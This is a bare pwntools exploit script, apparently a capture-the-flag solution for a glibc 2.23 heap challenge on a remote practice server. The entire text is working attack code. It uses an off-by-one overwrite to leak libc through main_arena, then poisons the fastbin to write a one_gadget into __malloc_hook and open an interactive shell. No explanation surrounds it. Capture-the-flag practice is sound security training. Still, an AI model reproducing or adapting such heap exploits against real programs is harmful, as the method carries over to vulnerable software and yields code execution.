#BY FMYY
#off by one
from pwn import*
def add(size,content):	#7
	p.sendlineafter('choice: ','1')
	p.sendlineafter('size?',str(size))
	p.sendafter('content:',content)
def edit(index,content):
	p.sendlineafter('choice: ','2')
	p.sendlineafter('idx?',str(index))
	p.sendafter('content:',content)
def show(index):
	p.sendlineafter('choice: ','3')
	p.sendlineafter('idx?',str(index))
def free(index):		#3
	p.sendlineafter('choice: ','4')
	p.sendlineafter('idx?',str(index))
#p = process('./simpleHeap')
p = remote('node3.buuoj.cn',29708)
libc = ELF('./libc-2.23.so')
context.log_level = 'debug'
add(0x28,'\n') #0
add(0x68,'\n') #1
add(0x68,'\n') #2
add(0x20,'\n') #3
payload = '\x00'*0x28 + '\xE1'
edit(0,payload)
free(1)
add(0x68,'\n') #1
show(2)
main_arena = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - 88
log.success('Main_Arena:\t' + hex(main_arena))
libcbase = main_arena - (libc.symbols['__malloc_hook'] + 0x10)
malloc_hook = libcbase + libc.symbols['__malloc_hook']
log.success('Malloc_Hook:\t' + hex(malloc_hook))
realloc = libcbase + 0x846CC
one_gadget = libcbase + 0x4526A
add(0x60,'\n') #4 ->2
free(3)
free(2)
payload = p64(malloc_hook-0x23)+'\n'
edit(4,payload)
add(0x60,'\n')
add(0x60,'\x00'*(0x13-8) + p64(one_gadget)+p64(realloc)+'\n')
p.sendlineafter('choice: ','1')
p.sendlineafter('size?','32')
p.interactive()
